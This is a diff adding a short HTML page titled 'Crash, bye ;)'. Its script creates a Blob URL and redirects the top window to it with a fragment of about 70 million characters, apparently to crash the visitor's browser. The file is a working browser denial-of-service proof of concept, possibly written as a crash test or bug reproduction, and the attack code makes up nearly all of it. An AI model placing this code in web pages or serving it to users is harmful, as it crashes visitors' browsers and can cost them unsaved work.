@@ -1,0 +1,8 @@
+<h1>Crash, bye ;)</h1>
+<script>
+
+const blob = new Blob(['<h1>test</h1>'], { type: 'text/html' }); // Blob with text/html content-type
+const blobUrl = URL.createObjectURL(blob); // Create the blob
+location=blobUrl+"#123456".repeat(9999999); // Redirect top window to the blob with the hash fragment long url
+
+</script>
